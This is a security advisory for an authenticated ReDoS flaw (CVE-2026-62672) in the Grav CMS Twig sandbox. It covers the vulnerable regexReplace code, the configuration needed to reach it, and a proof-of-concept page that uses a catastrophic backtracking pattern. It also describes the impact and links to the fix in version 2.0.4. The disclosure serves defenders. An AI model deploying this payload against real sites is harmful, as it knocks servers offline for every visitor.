# [M] Grav: Authenticated ReDoS via regex_replace in Twig Sandbox

## Summary
Severity: Medium
Advisory: GHSA-37f3-6p89-6qr9
CVE: CVE-2026-62672
CWE: CWE-1333
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V3)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-37f3-6p89-6qr9
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.4

## Details
### Summary

The `regex_replace` filter and function are allowlisted in Grav's Twig content sandbox. When Twig processing in page content is enabled `security.twig_content.process_enabled: true`, authenticated page editors can supply a catastrophically backtracking PCRE pattern, causing unbounded CPU consumption and denying service to the entire web server process.

---

### Details

The Twig sandbox allowlists, defined in `system/config/security.yaml`, explicitly include `regex_replace` in both the filter and function permission lists:

**Source: `system/config/security.yaml`**

```yaml
twig_sandbox:
  allowed_filters:
    # ...
    - regex_replace    #  user-controlled pattern allowed in sandbox
  allowed_functions:
    # ...
    - regex_replace    #  same
```

The underlying implementation passes the caller-controlled `$pattern` directly into PHP's `preg_replace()` without any pattern complexity validation:

**Source: `system/src/Grav/Common/Twig/Extension/GravExtension.php:1317-1319`**

```php
public function regexReplace($subject, $pattern, $replace, $limit = -1)
{
    return preg_replace($pattern, $replace, $subject, $limit);
}
```

When `twig_content.process_enabled` is `true`, page body content is sandboxed but can use any allowlisted filter. An editor who embeds a catastrophic backtracking pattern causes the PCRE engine to enter exponential time complexity, consuming 100% CPU until the PHP process is killed or the request times out.

**Conditions required**:
1. `security.twig_content.process_enabled: true` (opt-in, `false` by default on fresh 2.0 installs)
2. `security.twig_sandbox.enabled: true` (default) - the function is reachable under sandbox
3. Attacker must have page edit access (authenticated contributor / editor role)

---

### PoC

**Configuration prerequisite** - enable Twig in content:

```yaml
# user/config/security.yaml
twig_content:
  process_enabled: true
```

**Payload** — embed in any Grav page body with `process: { twig: true }` in frontmatter:

```
---
title: Test
process:
  twig: true
---
{{ 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab'|regex_replace('/^(a+)+$/', '') }}
```

Or as a function call in a page where the editor has Twig access:

```twig
{{ regex_replace('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab', '/^(a+)+$/', '') }}
```

**Result**: The PHP-FPM worker (or CLI server process) enters catastrophic PCRE backtracking. On a 2 GHz host, a 32-character string with the above pattern will exhaust one CPU core for seconds to minutes. With a slightly longer string, the time grows exponentially.

---

### Impact

**Vulnerability type**: Regular Expression Denial of Service - ReDoS

**Who is impacted**: Server availability. Any Grav installation where:
- An editor-role account exists (or has been compromised), AND
- The operator has enabled `twig_content.process_enabled: true`

An attacker with page-edit access can render the site unresponsive for all visitors by publishing a page with a catastrophic regex. On single-worker PHP configurations this is a complete outage. On multi-worker setups, multiple concurrent page renders of the malicious page can saturate all workers.

---

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-37f3-6p89-6qr9
- https://nvd.nist.gov/vuln/detail/CVE-2026-62672
- https://github.com/getgrav/grav/commit/907116268ad4f48be7472c57f64981918578599a
- https://github.com/getgrav/grav
- https://github.com/getgrav/grav/releases/tag/2.0.4
